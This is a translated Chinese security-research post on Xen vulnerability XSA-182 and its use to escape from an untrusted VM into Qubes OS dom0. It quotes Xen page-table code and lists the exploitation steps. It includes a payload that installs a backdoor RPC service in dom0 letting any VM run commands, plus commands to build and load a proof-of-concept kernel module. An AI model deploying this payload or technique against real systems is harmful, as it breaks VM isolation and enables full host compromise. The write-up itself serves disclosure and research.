---
layout: post
title: "Xen攻击第三篇:XSA-182--逃逸Qubes"
---

**原链: <http://blog.quarkslab.com/xen-exploitation-part-3-xsa-182-qubes-escape.html>**

**作者: Jeremie Boutoille、Gabriel Campana**

**译者: Au2o3t@GearTeam**

**审校: Terence@GearTeam**

**Xen作现代虚拟化平台的一个重要代表,它的安全性值得全世界黑客的关注。这是Xen攻击系列关于Xen安全的最后一篇(1)(2)。本文讲述通过我们自己发现的漏洞(XSA-182)(0)(CVE-2016-6258)转而在 Qubes 系统项目中实现攻击利用。**

我们会先阐述发现漏洞的方法,再来探讨 Qubes 系统上的利用。需要强调说明的是,该漏洞并不在 Qubes 系统代码中,但由于 Qubes 系统依赖Xen,因此受此漏洞影响。

<!-- more -->

详细内容见 Qubes 的安全公告 #24 (8)。

![][1]

截图显示的是新装的 Qubes 系统。终端在攻击者获得访问的不可信虚拟机中运行。利用漏洞,其可以完全控制 dom0。由此便能用 shell 脚本在 dom0 执行任意命令(如图中灰色边框和标题的计算器),从而访问其它虚拟机。

# 漏洞发现

写完 XSA-148(2) 的利用,我们对半虚拟化客户机的内存管理内幕感到好奇。由于 PV 客户机内核运行在3环,任何特权操作必须通过超级调用实现。Xen 必须模拟一些机制来保护运行在3环的内核。对于半虚拟化来说,从3环跳到0环也就意味着虚拟机逃逸。

## GDT的例子

举个有趣的例子:全局描述符表(GDT)。GDT 包含内存段的信息,也包含调用门,陷阱门,任务切换段(TSS)和任务门。这些机制允许特权转换。某些机制是很复杂的,应严格验证任何对 GDT 的更新。作为 GDT 条目传给 alloc_segdesc_page 函数的每一页由 check_descriptor 函数作检查。这个不太长的函数没一句是多余的:

```
/* Returns TRUE if given descriptor is valid for GDT or LDT. */
int check_descriptor(const struct domain *dom, struct desc_struct *d)
{
    u32 a = d->a, b = d->b;
    u16 cs;
    unsigned int dpl;

    /* A not-present descriptor will always fault, so is safe. */
    if ( !(b & _SEGMENT_P) )
        goto good;

    /* Check and fix up the DPL. */
    dpl = (b >> 13) & 3;
    __fixup_guest_selector(dom, dpl);
    b = (b & ~_SEGMENT_DPL) | (dpl << 13);

    /* All code and data segments are okay. No base/limit checking. */
    if ( (b & _SEGMENT_S) )
    {
        /* SNIP SNIP SNIP */
        goto good;
    }

    /* Invalid type 0 is harmless. It is used for 2nd half of a call gate. */
    if ( (b & _SEGMENT_TYPE) == 0x000 )
        goto good;

    /* Everything but a call gate is discarded here. */
    if ( (b & _SEGMENT_TYPE) != 0xc00 )
        goto bad;

    /* Validate the target code selector. */
    cs = a >> 16;
    if ( !guest_gate_selector_okay(dom, cs) )
        goto bad;
    /*
     * Force DPL to zero, causing a GP fault with its error code indicating
     * the gate in use, allowing emulation. This is necessary because with
     * native guests (kernel in ring 3) call gates cannot be used directly
     * to transition from user to kernel mode (and whether a gate is used
     * to enter the kernel can only be determined when the gate is being
     * used), and with compat guests call gates cannot be used at all as
     * there are only 64-bit ones.
     * Store the original DPL in the selector's RPL field.
     */
    b &= ~_SEGMENT_DPL;
    cs = (cs & ~3) | dpl;
    a = (a & 0xffffU) | (cs << 16);

    /* Reserved bits must be zero. */
    if ( b & (is_pv_32bit_domain(dom) ? 0xe0 : 0xff) )
        goto bad;

 good:
    d->a = a;
    d->b = b;
    return 1;
 bad:
    return 0;
}
```

仔细看看这段令人抓狂的代码,Intel 文档是唯一能让你了解每一位含义的帮手。热心读者会发现代码中的注释:调用门通过强制设置 DPL 描述符为0,导致一般保护错误来仿真。相信我,调用门的代码仿真是个噩梦(好奇的读者参见函数 emulate_gate_op)。

既然我们没发现 GDT 管理的漏洞,那么接下来就再看看页表管理吧。

## 页表管理

首先,我们模糊测试 HYPERVISOR_mmu_update 这个超级调用。我们的想法是生成一个随机页表条目并更新,若能成功的话,检查新映射是否危险。我们需要定义一个危险映射的列表,如:

* 一个L1条目以 USER 和 RW 标志映射另一个 Lx 表,
* 一个 L2/L3/L4 条目以 PSE,USER和 RW 标志映射另一个Lx表,
* 一个 Ly 条目以 USER和 RW 标志映射另一个 Lx 表,且 x != y-1。

模糊测试前,我们先手动检查是否可以建立这样的映射。最后一种情况很有趣,且必须解释一下。让我们想象一个 L4 条目以 RW 标志映射它自身。使用特定的虚拟地址,L4 变为可写,Xen “不变性”被绕过。这样建立的映射能通过 Xen 的安全检查:

```
#define define_get_linear_pagetable(level)                                  \
static int                                                                  \
get_##level##_linear_pagetable(                                             \
    level##_pgentry_t pde, unsigned long pde_pfn, struct domain *d)         \
{                                                                           \
    unsigned long x, y;                                                     \
    struct page_info *page;                                                 \
    unsigned long pfn;                                                      \
                                                                            \
    if ( (level##e_get_flags(pde) & _PAGE_RW) )                             \
    {                                                                       \
        MEM_LOG("Attempt to create linear p.t. with write perms");          \
        return 0;                                                           \
    }                                                                       \
                                                                            \
    if ( (pfn = level##e_get_pfn(pde)) != pde_pfn )                         \
    {                                                                       \
        /* Make sure the mapped frame belongs to the correct domain. */     \
        if ( unlikely(!get_page_from_pagenr(pfn, d)) )                      \
            return 0;                                                       \
                                                                            \
        /*                                                                  \
         * Ensure that the mapped frame is an already-validated page table. \
         * If so, atomically increment the count (checking for overflow).   \
         */                                                                 \
        page = mfn_to_page(pfn);                                            \
        y = page->u.inuse.type_info;                                        \
        do {                                                                \
            x = y;                                                          \
            if ( unlikely((x & PGT_count_mask) == PGT_count_mask) ||        \
                 unlikely((x & (PGT_type_mask|PGT_validated)) !=            \
                          (PGT_##level##_page_table|PGT_validated)) )       \
            {                                                               \
                put_page(page);                                             \
                return 0;                                                   \
            }                                                               \
        }                                                                   \
        while ( (y = cmpxchg(&page->u.inuse.type_info, x, x + 1)) != x );   \
    }                                                                       \
                                                                            \
    return 1;                                                               \
}
```

上面代码定义了用于创建检查给定等级页表自映射条目的函数的宏。若 RW 位为1的条目被直接创建,管理程序会返回错误。但 XSA-148(2)中有设置安全标志的快速路径。这样更新的条目因被认为是安全的,不会检查“不变性”。 `_PAGE_REW` 作为标志的一部分,同样被认为是安全的:

```
/* Update the L4 entry at pl4e to new value nl4e. pl4e is within frame pfn. */
static int mod_l4_entry(l4_pgentry_t *pl4e,
                        l4_pgentry_t nl4e,
                        unsigned long pfn,
                        int preserve_ad,
                        struct vcpu *vcpu)
{
    struct domain *d = vcpu->domain;
    l4_pgentry_t ol4e;
    int rc = 0;

    if ( unlikely(!is_guest_l4_slot(d, pgentry_ptr_to_slot(pl4e))) )
    {
        MEM_LOG("Illegal L4 update attempt in Xen-private area %p", pl4e);
        return -EINVAL;
    }

    if ( unlikely(__copy_from_user(&ol4e, pl4e, sizeof(ol4e)) != 0) )
        return -EFAULT;

    if ( l4e_get_flags(nl4e) & _PAGE_PRESENT )
    {
        if ( unlikely(l4e_get_flags(nl4e) & L4_DISALLOW_MASK) )
        {
            MEM_LOG("Bad L4 flags %x",
                    l4e_get_flags(nl4e) & L4_DISALLOW_MASK);
            return -EINVAL;
        }

        /* Fast path for identical mapping and presence. */
        if ( !l4e_has_changed(ol4e, nl4e, _PAGE_PRESENT) )
        {
            adjust_guest_l4e(nl4e, d);
            rc = UPDATE_ENTRY(l4, pl4e, ol4e, nl4e, pfn, vcpu, preserve_ad);
            return rc ? 0 : -EFAULT;
        }
```

这段代码在条目及 PRESENT 标志不变时使用快速路径,可使我们在自映射条目中设置 RW 标志。

我们可以如下步骤:

* 创建不带 RW 标志的自映射条目,
* 通过快速路径添加 RW 标志
* 以写权限访问页目录
* 虚拟机逃逸

下面的方案说明了这样一个在条目42上的内存映射:

```
VADDR : (42 << 39) | (42 << 30) | (42 << 21) | (42 << 12)
         +------------+------------+------------+
         |
         |            L4
CR3 -----|---->+-------------+<-+
         |    0|.............|  |
         |     |.............|  |
         |     |.............|  |
         +-->42|L4, RW, U, P |--+
               |.............|
               |.............|
            511|.............|
               +-------------+
```

# 利用

利用情况和XSA-148(2)案例完全一样:

* 遍历整个宿主机内存,
* 寻找页目录,
* 以 start_info 结构定位 dom0,
* 找到 vDSO 页并补丁之,
* 在 dom0 中拿到root shell。

如介绍中所述,我们决定在 Qubes 系统中利用漏洞。如果你一点都不了解 Qubes,这里有一些网上的信息(4):

```
Qubes 操作系统是什么?

Qubes 是一个安全的操作系统(OS),OS 是在计算机上运行其它所有程序的软件,一些流行的操作系统如微软的 Windows 系统,苹果 OS X,安卓,IOS。Qubes 是自由且开源的(FOSS)。这意味着每个人都可以自由使用,复制,并以任何方式改变软件。这也意味着其源代码是公开的,任何人都可以贡献源码和进行审计。

Qubes 系统如何保证安全?

Qubes使用名为“安全隔离”的方法,允许用户把数字生活的各部分隔离到安全分离的虚拟机中(VMS)。虚拟机基本上是一个在物理计算机上运行的模拟有自己的操作系统的计算机软件。你可以把一个虚拟机作为一台计算机内的计算机。
```

Qubes系统使用Xen管理器管理隔离的虚拟机。若攻击者能在其虚拟机中从 Qubes的dom0执行代码,则系统不能保证任何安全。在dom0中执行代码已经实现了,但由于Qubes提供了防火墙,我们不能使用经典的netcat,必须换一个载体。

看看 Qubes RPC服务(5)。RPC服务允许 Qubes 系统中虚拟机间通信,如剪切板,文件拷贝等等。各服务都有指定源虚拟机,目的虚拟机以及申请策略(允许,拒绝或询问)。

我们的想法是,在 dom0 环境中执行一段代码来添加一个 RPC 服务。我们可以用scumjr(6)的方法优雅的办到:

```
python:
        ;;      mov     rcx, rip+8
        lea     rcx, [rel $ +8]
        ret
        db '-cimport os;x=open("/tmp/.x", "w");x.close();'
        db 'service=open("/etc/qubes_backdoor", "w");'
        db 'service.write("#!/bin/bash\n");'
        db 'service.write("read arg1\n");'
        db 'service.write("($arg1)\n");'
        db 'service.close();'
        db 'os.system("chmod +x /etc/qubes_backdoor");'
        db 'rpc=open("/etc/qubes-rpc/qubes.Backdoor", "w");'
        db 'rpc.write("/etc/qubes_backdoor\n");'
        db 'rpc.close();'
        db 'policy=open("/etc/qubes-rpc/policy/qubes.Backdoor", "w");'
        db 'policy.write("$anyvm dom0 allow");'
        db 'policy.close();'
        db      0
```

增加了一个名为 qubes 的服务。后门执行每一个给定的命令。

由于此漏洞一周前刚披露,我们不想今天就发布一份完整利用,给用户带来风险。但提供一份 Xen 漏洞的PoC:[xsa-182-poc.tar.gz](https://blog.quarkslab.com/resources/2016-08-04-xen_exploitation_part_3_xsa_148/xsa-182-poc.tar.gz):

```
$ tar xzvf xsa-182-poc.tar.gz
$ make -C xsa-182-poc/
$ sudo insmod xsa-182-poc/xsa-182-poc.ko
$ sudo rmmod xsa-182-poc
$ dmesg | grep xsa-182
```

如果你使用的是有漏洞的 Qubes 版本,通过 Qubes 虚拟机管理器升级dom0软件或使用如下命令即可:

```
$ sudo qubes-dom0-update
```

# 硬件虚拟化和虚拟机管理程序的安全性

在CanSecWest 2010 上Julien Tinnès 和Tavis Ormandy 在Virtualisation security和 Intel privilege model的演讲中解释了虚拟化的不同类型,并指出了开发安全hypervisor所面临的挑战。事实上半虚拟化非常复杂,和二进制翻译很相似。如介绍所述,要使处理所有细节都像一个真CPU很困难。半虚拟化错误通常会导致客户机提权或客户机逃逸。没有硬件虚拟化时,二进制翻译和半虚拟化是强制性的,但Intel VT-x 和 AMD SVM技术的推出改变了这种情况。

由于一些新增的CPU指令,硬件虚拟化使Hyper-visor的开发更容易和安全得多。二级地址翻译(10)(Inter的EPT 和AMD的RVI)可以避免影子页表的复杂性。我们并不认为半虚拟化和硬件虚拟化的客户机之间有明显差异,虽然我们没有一个标准。

此外,依托硬件虚拟化的Hyper-visor安全性还可以继续提高。谷歌采取的减少KVM攻击面的方法似乎很有吸引力(11)(12)。许多功能被移至用户空间,因此可以很容易放在沙盒中。对设备的模拟会引入巨大的攻击面,KVM不像Xen,其似乎不能在非可信虚拟机中隔离设备。

# 结论

半虚拟化安全确实很难得到保证。其引入了非常复杂的代码,且有很多安全问题。Qubes系统决定从 4.0版(7)启强制使用硬件虚拟化,去除半虚拟化。我们相信这是一个英明的决定,因为硬件虚拟化的安全问题较少。

最近我们又发现了另一个影响半虚拟化客户机,能使客户机逃逸到宿主机的漏洞。然而,我们认为不需要另写一篇博文,因为其和本漏洞极其相似。

希望你们能喜欢这3篇写Xen的文章!感谢每一个为这些文章贡献过的人;)

(0) <http://xenbits.xen.org/xsa/advisory-182.html>

(1) <http://blog.quarkslab.com/xen-exploitation-part-1-xsa-105-from-nobody-to-root.html>

(2) (1, 2, 3, 4) <http://blog.quarkslab.com/xen-exploitation-part-2-xsa-148-from-guest-to-host.html>

(3) <https://www.qubes-os.org/>

(4) <https://www.qubes-os.org/tour/#what-is-qubes-os>

(5) <https://www.qubes-os.org/doc/qrexec3/>

(6) <https://scumjr.github.io/2016/01/10/from-smm-to-userland-in-a-few-bytes/>

(7) <https://www.qubes-os.org/news/2016/07/21/new-hw-certification-for-q4/>

(8) <https://github.com/QubesOS/qubes-secpack/blob/master/QSBs/qsb-024-2016.txt>

(9) <https://www.cr0.org/paper/jt-to-virtualisation_security.pdf>

(10) <https://en.wikipedia.org/wiki/Second_Level_Address_Translation>

(11) <https://lwn.net/Articles/619376/>

(12) <http://www.linux-kvm.org/images/f/f6/01×02-KVMHardening.pdf>

(13) <http://blog.quarkslab.com/resources/2016-08-04-xen_exploitation_part_3_xsa_148/xsa-182-poc.tar.gz>

[1]: https://blog.quarkslab.com/resources/2016-08-04-xen_exploitation_part_3_xsa_148/qubes_escape.png
